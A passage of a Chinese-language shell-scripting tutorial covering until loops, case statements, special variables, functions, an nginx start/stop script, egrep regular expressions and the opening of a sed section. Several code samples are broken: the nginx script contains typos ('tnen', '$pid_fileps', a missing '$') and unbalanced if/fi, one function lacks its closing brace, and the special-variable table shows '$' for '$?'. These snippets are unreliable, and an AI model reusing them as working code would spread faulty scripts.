<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">九九乘法表</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">n=1</span><br><span class="line">while [ $n -lt 10 ];do</span><br><span class="line">	for ((m=1;m&lt;=$n;m++));do</span><br><span class="line">		echo -n -e &quot;$m*$n=$((m*n))\t&quot;</span><br><span class="line">	done</span><br><span class="line">	echo</span><br><span class="line">	n=$((n+1))</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h2 id="十、shell流程控制-until循环语句"><a href="#十、shell流程控制-until循环语句" class="headerlink" title="十、shell流程控制-until循环语句"></a>十、shell流程控制-until循环语句</h2><ul>
<li>until介绍</li>
<li>until语法</li>
<li>案例分享</li>
</ul>
<hr>
<h3 id="1-until介绍"><a href="#1-until介绍" class="headerlink" title="1. until介绍"></a>1. until介绍</h3><p>和while正好相反，until是条件为假开始执行，条件为真停止执行。</p>
<h3 id="2-until语法"><a href="#2-until语法" class="headerlink" title="2. until语法"></a>2. until语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">until [ condition ]      #注意，条件为假until才会循环，条件为真，until停止循环</span><br><span class="line"> do</span><br><span class="line">         commands代码块</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h3 id="3-案例"><a href="#3-案例" class="headerlink" title="3.案例"></a>3.案例</h3><ol>
<li>打印10-20数字</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">init_num=10</span><br><span class="line">until [ $init_num -gt 20 ]</span><br><span class="line">   do</span><br><span class="line">       echo $init_num</span><br><span class="line">       init_num=$((init_num + 1))</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h2 id="十一、shell流程控制-case条件判断语句"><a href="#十一、shell流程控制-case条件判断语句" class="headerlink" title="十一、shell流程控制-case条件判断语句"></a>十一、shell流程控制-case条件判断语句</h2><ul>
<li>case介绍</li>
<li>case语法</li>
<li>shell特殊变量</li>
</ul>
<hr>
<h3 id="1-case介绍"><a href="#1-case介绍" class="headerlink" title="1. case介绍"></a>1. case介绍</h3><p>在生产环境中，我们总会遇到一个问题需要根据不同的状况来执行不同的预案，那么我们要处理这样的问题就要首先根据可能出现的情况写出对应预案，根据出现的情况来加载不同的预案。</p>
<p><strong>特点：根据给予的不同条件执行不同的代码块</strong></p>
<h3 id="2-case语法"><a href="#2-case语法" class="headerlink" title="2. case语法"></a>2. case语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case 变量  in </span><br><span class="line">条件1）</span><br><span class="line">           执行代码块1</span><br><span class="line">;;</span><br><span class="line">条件2）</span><br><span class="line">           执行代码块2</span><br><span class="line">;;</span><br><span class="line">......</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
<p><strong>注意：每个代码块执行完毕要以;;结尾代表结束，case结尾要以倒过来写的esac来结束。</strong></p>
<p>案例说明</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read -p &quot;NUM: &quot; N</span><br><span class="line">case $N in</span><br><span class="line">1)</span><br><span class="line">   echo haha</span><br><span class="line">;;</span><br><span class="line">2)</span><br><span class="line">  echo hehe</span><br><span class="line">;;</span><br><span class="line">3)</span><br><span class="line">   echo heihei</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo bye</span><br><span class="line">;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>


<h3 id="3-shell特殊变量"><a href="#3-shell特殊变量" class="headerlink" title="3. shell特殊变量"></a>3. shell特殊变量</h3><p>特殊参数：</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$*</td>
<td>代表所有参数，其间隔为IFS内定参数的第一个字元</td>
</tr>
<tr>
<td align="center">$@</td>
<td>与*星号类同。不同之处在於不参照IFS</td>
</tr>
<tr>
<td align="center">$#</td>
<td>代表参数数量</td>
</tr>
<tr>
<td align="center">$</td>
<td>执行上一个指令的返回值</td>
</tr>
<tr>
<td align="center">$-</td>
<td>最近执行的foreground pipeline的选项参数</td>
</tr>
<tr>
<td align="center">$N</td>
<td>shell的第几个外传参数</td>
</tr>
<tr>
<td align="center">$_</td>
<td>显示出最後一个执行的命令</td>
</tr>
<tr>
<td align="center">$$</td>
<td>本身的Process ID</td>
</tr>
<tr>
<td align="center">$0</td>
<td>脚本的名字</td>
</tr>
</tbody></table>
<h2 id="十二、shell函数"><a href="#十二、shell函数" class="headerlink" title="十二、shell函数"></a>十二、shell函数</h2><ul>
<li>函数介绍</li>
<li>函数语法</li>
<li>函数应用</li>
<li>实战</li>
</ul>
<hr>
<h3 id="1-函数介绍"><a href="#1-函数介绍" class="headerlink" title="1.函数介绍"></a>1.函数介绍</h3><p>在写代码的时候，我们很多人习惯从头写到结束，完成以后在一起测试。但是到测试阶段才发现：错误一大堆，上帝啊！弄死我吧！</p>
<p>为了解决这个问题，建议大家把代码模块化，一个模块实现一个功能，哪怕是一个很小的功能都可以，这样的话我们写代码就会逻辑上比较简单，代码量比较少，排错简单，这也就是函数的好处。</p>
<p>函数的优点：</p>
<ol>
<li>代码模块化，调用方便，节省内存</li>
<li>代码模块化，代码量少，排错简单</li>
<li>代码模块化，可以改变代码的执行顺序</li>
</ol>
<h3 id="2-函数的语法"><a href="#2-函数的语法" class="headerlink" title="2.函数的语法"></a>2.函数的语法</h3><p>语法一：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">函数名 () &#123;</span><br><span class="line">    代码块</span><br><span class="line">    return N</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>语法二：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function 函数名 &#123;</span><br><span class="line">      代码块</span><br><span class="line">      return N</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-函数的应用"><a href="#3-函数的应用" class="headerlink" title="3.函数的应用"></a>3.函数的应用</h3><h4 id="3-1定义一个函数"><a href="#3-1定义一个函数" class="headerlink" title="3.1定义一个函数"></a>3.1定义一个函数</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">print () &#123;</span><br><span class="line">    echo &quot;welcome to ayitula&quot;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function hello &#123;</span><br><span class="line">    echo &quot;hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>print 和 hello就是函数的名字，函数名字命名参考变量一节中的变量命名规则</p>
<h4 id="3-2函数应用"><a href="#3-2函数应用" class="headerlink" title="3.2函数应用"></a>3.2函数应用</h4><p>定义好函数后，如果想调用该函数，只需通过函数名调用即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">N1 () &#123;</span><br><span class="line">	echo &quot;`date +%F`&quot;</span><br><span class="line">&#125;</span><br><span class="line">N2 () &#123;</span><br><span class="line">	echo -e &quot;\t\t\t\twelcome to ayitula&quot;</span><br><span class="line">	echo -e &quot;\n&quot;</span><br><span class="line">&#125;</span><br><span class="line">N3 () &#123;</span><br><span class="line">	echo &quot;1) 剪子&quot;</span><br><span class="line">	echo &quot;2) 石头&quot;</span><br><span class="line">	echo &quot;3) 布&quot;</span><br><span class="line">&#125;</span><br><span class="line">N4 () &#123;</span><br><span class="line">	echo -e &quot;\n\n\n&quot;</span><br><span class="line">	read -p &quot;请输入代码: &quot; DL</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">调用代码</span></span><br><span class="line">N2</span><br><span class="line">N1</span><br><span class="line">N3</span><br><span class="line">N4</span><br></pre></td></tr></table></figure>


<h3 id="4-实战"><a href="#4-实战" class="headerlink" title="4.实战"></a>4.实战</h3><p> nginx启动管理脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nginx service manage script</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">variables</span></span><br><span class="line">nginx_install_doc=/usr/local/nginx</span><br><span class="line">proc=nginx</span><br><span class="line">nginxd=$nginx_install_doc/sbin/nginx</span><br><span class="line">pid_file=$nginx_install_doc/logs/nginx.pid</span><br><span class="line">nginx_process_id=`cat $pid_fileps`</span><br><span class="line">ngnix_process_num=`ps aux |grep nginx_process_id|grep -v &quot;grep&quot;|wc -l`</span><br><span class="line"><span class="meta">#</span><span class="bash">Source <span class="keyword">function</span> library</span></span><br><span class="line">if [ -f /etc/init.d/functions ];then</span><br><span class="line">	. /etc/init.d/functions</span><br><span class="line">else</span><br><span class="line">	echo &quot;not found /etc/init.d/functions&quot;</span><br><span class="line">	exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">function</span></span></span><br><span class="line">start () &#123;</span><br><span class="line"><span class="meta">#</span><span class="bash">如果nginx没有启动直接启动，否则报错已经启动</span></span><br><span class="line">if [ -f $pid_file ];tnen</span><br><span class="line">	if [ -f $pid_file ]&amp;&amp;[ $ngnix_process_num -ge 1 ];then</span><br><span class="line">		echo &quot;nginx running ......&quot;</span><br><span class="line">	else</span><br><span class="line">		if [ -f $pid_file ]&amp;&amp;[ $ngnix_process_num -lt 1 ];then</span><br><span class="line">		rm -f $pid_file	</span><br><span class="line">        echo &quot;ngin start `daemon $nginxd`&quot;</span><br><span class="line">	fi</span><br><span class="line">	echo &quot;ngin start `daemon $nginxd`&quot;</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stop () &#123;</span><br><span class="line">	if [ -f $pid_file ]&amp;&amp;[ $ngnix_process_num -ge 1 ];then</span><br><span class="line">		action &quot;ngnix stop&quot; killall -s QUIT $proc</span><br><span class="line">		rm -f $pid_file</span><br><span class="line">	else</span><br><span class="line">		action &quot;nginx stop&quot; killall -s QUIT $proc 2&gt;/dev/null</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">restart () &#123;</span><br><span class="line">	stop</span><br><span class="line">	sleep 1</span><br><span class="line">	start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reload () &#123;</span><br><span class="line">	if [ -f $pid_file ]&amp;&amp;[ $ngnix_process_num -ge 1 ];then</span><br><span class="line">		action &quot;nginx reload&quot; killall -s HUP $proc</span><br><span class="line">	else</span><br><span class="line">		action &quot;nginx reload&quot; killall -s HUP $proc	2&gt;/dev/null</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status () &#123;</span><br><span class="line">	if [ -f $pid_file ]&amp;&amp;[ $ngnix_process_num -ge 1 ];then</span><br><span class="line">		echo &quot;nginx running ...&quot;</span><br><span class="line">	else</span><br><span class="line">		echo &quot;nginx stop&quot;</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">callable</span></span><br><span class="line">case $1 in</span><br><span class="line">start) start;;</span><br><span class="line">stop) stop;;</span><br><span class="line">restart) restart;;</span><br><span class="line">reload) reload;;</span><br><span class="line">status) status;;</span><br><span class="line">*) echo &quot;USAGE:$0 start|stop|restart|reload|status&quot;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>


<h2 id="十三、正则表达式"><a href="#十三、正则表达式" class="headerlink" title="十三、正则表达式"></a>十三、正则表达式</h2><ul>
<li>正则表达式介绍</li>
<li>特殊字符</li>
<li>POSIX特殊字符</li>
</ul>
<hr>
<h3 id="1-正则表达式介绍"><a href="#1-正则表达式介绍" class="headerlink" title="1.正则表达式介绍"></a>1.正则表达式介绍</h3><p>正则表达式是一种文本模式匹配，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）。它是一种字符串匹配的模式，可以用来检查一个字符串是否含有某种子串、将匹配的子串替换或者从某个字符串中取出某个条件的子串。</p>
<p>正则表达式就像数学公式一样，我们可以通过正则表达式提供的一些特殊字符来生成一个匹配对应字符串的公式，用此来从海量数据中匹配出自己想要的数据。</p>
<p>正则表达式是一个三方产品，被常用计算机语言广泛使用，比如：shell、PHP、python、java、js等！</p>
<p>shell也支持正则表达式，但不是所有的命令都支持正则表达式，常见的的命令中只有grep、sed、awk命令支持正则表达式。</p>
<h3 id="2-特殊字符"><a href="#2-特殊字符" class="headerlink" title="2.特殊字符"></a>2.特殊字符</h3><p>定位符使用技巧：同时锚定开头和结尾，做精确匹配；单一锚定开头和结尾，做模糊匹配。</p>
<table>
<thead>
<tr>
<th align="center">定位符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">^</td>
<td align="center">锚定开头 ^a 以a开头 默认锚定一个字符</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">锚定结尾 a$ 以a结尾 默认锚定一个字符</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾的字符串</span></span><br><span class="line">egrep &quot;^ac$&quot; file </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">模糊匹配  以a开头的字符串</span></span><br><span class="line">egrep &quot;^a&quot; file </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">模糊匹配 以c结尾的字符串</span></span><br><span class="line">egrep &quot;c$&quot; file  </span><br></pre></td></tr></table></figure>
<p>匹配符:匹配字符串</p>
<table>
<thead>
<tr>
<th align="center"><strong>匹配符</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="left">匹配除回车以外的任意字符</td>
</tr>
<tr>
<td align="center">( )</td>
<td align="left">字符串分组</td>
</tr>
<tr>
<td align="center">[ ]</td>
<td align="left">定义字符类，匹配括号中的一个字符</td>
</tr>
<tr>
<td align="center">[ ^ ]</td>
<td align="left">表示否定括号中出现字符类中的字符,取反</td>
</tr>
<tr>
<td align="center">\</td>
<td align="left">转义字符</td>
</tr>
<tr>
<td align="center">|</td>
<td align="left">或</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间任意  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a.c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间不包含a-z,0-9  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[^a-z0-9]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以e开头f结尾  中间是*号  长度为三个字节的字符串  e*f</span></span><br><span class="line">egrep &quot;^e\*f$&quot; file </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头b或c结尾  中间是任意  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a.(b|c)$&quot; file </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">模糊匹配  以cc结尾的字符串   因为$只能锚定单个字符，如果是一个字符串就需要用()来做定义</span></span><br><span class="line">egrep &quot;(cc)$&quot; file</span><br></pre></td></tr></table></figure>
<p>限定符:对前面的字符或者字符串做限定说明</p>
<table>
<thead>
<tr>
<th align="center"><strong>限定符</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">*</td>
<td align="left">某个字符之后加星号表示该字符不出现或出现多次</td>
</tr>
<tr>
<td align="center">?</td>
<td align="left">与星号相似，但略有变化，表示该字符出现一次或不出现</td>
</tr>
<tr>
<td align="center">+</td>
<td align="left">与星号相似，表示其前面字符出现一次或多次，但必须出现一次</td>
</tr>
<tr>
<td align="center">{n,m}</td>
<td align="left">某个字符之后出现，表示该字符最少n次，最多m次</td>
</tr>
<tr>
<td align="center">{m}</td>
<td align="left">正好出现了m次</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头 c结尾 中间是有b或者没有b 长度不限的字符串</span></span><br><span class="line">egrep &quot;^ab*c$&quot; file</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头 c结尾 中间只出现一次b或者没有b的字符串</span></span><br><span class="line">egrep &quot;^ab?c$&quot; file </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头 c结尾 中间是有b且至少出现一次 长度不限的字符串</span></span><br><span class="line">egrep &quot;^ab+c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头 c结尾 中间是有b且至少出现两次最多出现四次 长度不限的字符串</span></span><br><span class="line">egrep &quot;^ab&#123;2,4&#125;c$&quot; file </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头 c结尾 中间是有b且正好出现三次的字符串</span></span><br><span class="line">egrep &quot;^ab&#123;3&#125;c$&quot; file </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配 以a开头 c结尾 中间是有b且至少出现一次的字符串</span></span><br><span class="line">egrep &quot;^ab&#123;1,&#125;c$&quot; file</span><br></pre></td></tr></table></figure>


<h3 id="3-POSIX特殊字符"><a href="#3-POSIX特殊字符" class="headerlink" title="3. POSIX特殊字符"></a>3. POSIX特殊字符</h3><table>
<thead>
<tr>
<th align="center"><strong>特殊字符</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">[:alnum:]</td>
<td align="left">匹配任意字母字符0-9 a-z A-Z</td>
</tr>
<tr>
<td align="center">[:alpha:]</td>
<td align="left">匹配任意字母，大写或小写</td>
</tr>
<tr>
<td align="center">[:digit:]</td>
<td align="left">数字 0-9</td>
</tr>
<tr>
<td align="center">[:graph:]</td>
<td align="left">非空字符( 非空格控制字符)</td>
</tr>
<tr>
<td align="center">[:lower:]</td>
<td align="left">小写字符a-z</td>
</tr>
<tr>
<td align="center">[:upper:]</td>
<td align="left">大写字符A-Z</td>
</tr>
<tr>
<td align="center">[:cntrl:]</td>
<td align="left">控制字符</td>
</tr>
<tr>
<td align="center">[:print:]</td>
<td align="left">非空字符( 包括空格)</td>
</tr>
<tr>
<td align="center">[:punct:]</td>
<td align="left">标点符号</td>
</tr>
<tr>
<td align="center">[:blank:]</td>
<td align="left">空格和TAB字符</td>
</tr>
<tr>
<td align="center">[:xdigit:]</td>
<td align="left">16 进制数字</td>
</tr>
<tr>
<td align="center">[:space:]</td>
<td align="left">所有空白字符( 新行、空格、制表符)</td>
</tr>
</tbody></table>
<p><strong>注意 <code>[[ ]]</code> 双中括号的意思:  第一个中括号是匹配符<code>[]</code>匹配中括号中的任意一个字符，第二个<code>[]</code>是格式 如[:digit:]</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间a-zA-Z0-9任意字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:alnum:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是a-zA-Z任意字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:alpha:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是0-9任意字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:digit:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是a-z任意字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:lower:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是A-Z任意字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:upper:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是非空任意字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:print:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是符号字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:punct:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是空格或者TAB符字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:blank:]]c$&quot; file</span><br><span class="line">egrep &quot;^a[[:space:]]c$&quot; file</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">精确匹配  以a开头c结尾  中间是十六进制字符  长度为三个字节的字符串</span></span><br><span class="line">egrep &quot;^a[[:xdigit:]]c$&quot; file</span><br></pre></td></tr></table></figure>
<p>案例</p>
<ol>
<li>匹配合法的IP地址</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">egrep &#x27;^((25[0-5]|2[0-4][[:digit:]]|[01]?[[:digit:]][[:digit:]]?).)&#123;3&#125;(25[0-5]|2[0-4][[:digit:]]|[01]?[[:digit:]][[:digit:]]?)$&#x27; —color ip.txt</span><br></pre></td></tr></table></figure>
<ol>
<li>匹配座机电话号码</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">egrep &#x27;^[[:graph:]]&#123;12&#125;$” number |egrep “^(0[1-9][0-9][0-9]?)-[1-9][0-9]&#123;6,7&#125;$&#x27;</span><br></pre></td></tr></table></figure>


<h2 id="十四、shell对文件的操作"><a href="#十四、shell对文件的操作" class="headerlink" title="十四、shell对文件的操作"></a>十四、shell对文件的操作</h2><ul>
<li>简介</li>
<li>sed命令</li>
<li>sed小技巧</li>
<li>实战</li>
</ul>
<hr>
<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>在shell脚本编写中，时常会用到对文件的相关操作，比如增加内容，修改内容，删除部分内容，查看部分内容等，但是上述举例的这些操作一般都是需要在文本编辑器中才能操作，常用的文本编辑器如：gedit、vim、nano等又是交互式文本编辑器，脚本无法自己独立完成，必须有人参与才可以完成。如果这样的话又违背了我们编写脚本的意愿(全部由机器来完成，减少人的工作压力，提升工作效率)。emm….如何才能让这些操作全部脚本自己就搞定，而不需要人的参与，而且又能按照我们的脚本预案来完成呢？</p>
<p>为了解决上述问题，linux为大家提供了一些命令,比如Perl、sed等命令，今天我就着重为大家介绍一下sed命令。</p>
<h3 id="2-sed命令"><a href="#2-sed命令" class="headerlink" title="2.sed命令"></a>2.sed命令</h3><p>sed是linux中提供的一个外部命令,它是一个行(流)编辑器，非交互式的对文件内容进行增删改查的操作，使用者只能在命令行输入编辑命令、指定文件名，然后在屏幕上查看输出。它和文本编辑器有本质的区别。</p>
<blockquote>
<p><strong>区别：</strong></p>
<p>文本编辑器: 编辑对象是文件</p>
<p>行编辑器：编辑对象是文件中的行</p>
</blockquote>
<p>也就是前者一次处理一个文本，而后者是一次处理一个文本中的一行。这个是我们应该弄清楚且必须牢记的，否者可能无法理解sed的运行原理和使用精髓。</p>
<h4 id="2-1-sed数据处理原理"><a href="#2-1-sed数据处理原理" class="headerlink" title="2.1 sed数据处理原理"></a>2.1 sed数据处理原理</h4><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210128150037313.png" alt="image-20210128150037313"></p>
<h4 id="2-2-sed命令"><a href="#2-2-sed命令" class="headerlink" title="2.2 sed命令"></a>2.2 sed命令</h4><p>语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed [options] &#x27;&#123;command&#125;[flags]&#x27; [filename]</span><br></pre></td></tr></table></figure>
<p>命令选项[options]</p>
<table>
<thead>
<tr>
<th align="center">选项[options]</th>
<th>定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-e script</td>
<td>将脚本中指定的命令添加到处理输入时执行的命令中  多条件，一行中要有多个操作</td>
</tr>
<tr>
<td align="center">-f script</td>
<td>将文件中指定的命令添加到处理输入时执行的命令中</td>
</tr>
<tr>
<td align="center">-n</td>
<td>抑制自动输出</td>
</tr>
<tr>
<td align="center">-i</td>
<td>编辑文件内容</td>
</tr>
<tr>
<td align="center">-i.bak</td>
<td>修改时同时创建.bak备份文件</td>
</tr>
<tr>
<td align="center">-r</td>
<td>使用扩展的正则表达式</td>
</tr>
<tr>
<td align="center">!</td>
<td>取反 （跟在模式条件后与shell有所区别）</td>
</tr>
</tbody></table>
<p>常用内部命令{command}</p>
<table>
<thead>
<tr>
<th align="center">命令{command}</th>
<th>定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">a</td>
<td>在匹配后面添加</td>
</tr>
<tr>
<td align="center">i</td>
<td>在匹配前面添加</td>
</tr>
<tr>
<td align="center">p</td>
<td>打印</td>
</tr>
<tr>
<td align="center">d</td>
<td>删除</td>
</tr>
<tr>
<td align="center">s</td>
<td>查找替换</td>
</tr>
<tr>
<td align="center">c</td>
<td>更改</td>
</tr>
<tr>
<td align="center">y</td>
<td>转换   N D P</td>
</tr>
</tbody></table>
<p>标志位[flags]</p>
<table>
<thead>
<tr>
<th align="center">标志[flags]</th>
<th>定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">数字</td>
<td>表示新文本替换的模式</td>
</tr>
<tr>
<td align="center">g</td>
<td>表示用新文本替换现有文本的全部实例</td>
</tr>
<tr>
<td align="center">p</td>
<td>表示打印原始的内容</td>
</tr>
<tr>
<td align="center">w filename</td>
<td>将替换的结果写入文件</td>
</tr>
</tbody></table>
<h5 id="2-2-1-sed内部命令说明"><a href="#2-2-1-sed内部命令说明" class="headerlink" title="2.2.1 sed内部命令说明"></a>2.2.1 sed内部命令说明</h5><ol>
<li>文件内容增加操作,将数据追加到某个位置之后，使用命令a。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在data1的每行后追加一行新数据内容: append data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;a\append data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在第二行后新开一行追加数据: append data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;2a\append data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在第二到四行每行后新开一行追加数据: append data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;2,4a\append data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">匹配字符串追加: 找到包含<span class="string">&quot;3 the&quot;</span>的行，在其后新开一行追加内容: append data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;/3 the/a\append data &quot;haha&quot;&#x27; data1</span><br></pre></td></tr></table></figure>
<p>​    <strong>//开启匹配模式  /要匹配的字符串/</strong></p>
<ol start="2">
<li>文件内容增加操作,将数据插入到某个位置之前，使用命令i。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在data1的每行前插入一行新数据内容: insert data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;i\insert data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在第二行前新开一行插入数据: insert data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;2i\insert data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在第二到四行每行前新开一行插入数据: insert data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;2,4i\insert data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">匹配字符串插入: 找到包含<span class="string">&quot;3 the&quot;</span>的行，在其前新开一行插入内容: insert data <span class="string">&quot;haha&quot;</span></span></span><br><span class="line">sed &#x27;/3 the/i\insert data &quot;haha&quot;&#x27; data1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>文件内容修改操作—替换,将一行中匹配的内容替换为新的数据，使用命令s。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">从标准输出流中做替换，将<span class="built_in">test</span>替换为text</span></span><br><span class="line">echo &quot;this is a test&quot; |sed &#x27;s/test/text/&#x27;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将data1中每行的dog替换为cat</span></span><br><span class="line">sed &#x27;s/dog/cat/&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将data1中第二行的dog替换为cat</span></span><br><span class="line">sed &#x27;2s/dog/cat/&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">将data1中第二到第四行的dog替换为cat</span></span><br><span class="line">sed &#x27;2,4s/dog/cat/&#x27; data1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">匹配字符串替换:将包含字符串<span class="string">&quot;3 the&quot;</span>的行中的dog替换为cat</span></span><br><span class="line">sed &#x27;/3 the/s/dog/cat/&#x27; data1</span><br></pre></td></tr></table></figure>
<ol start="4">
